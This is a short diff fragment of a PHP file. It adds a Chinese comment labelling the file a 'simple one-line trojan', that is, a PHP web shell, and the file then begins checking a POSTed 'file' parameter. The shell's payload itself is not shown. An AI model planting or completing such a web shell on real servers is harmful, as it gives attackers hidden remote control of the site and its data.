@@ -1,3 +1,4 @@
+#简单的一句话木马
 <?php
 
 if (isset($_POST['file'])) {
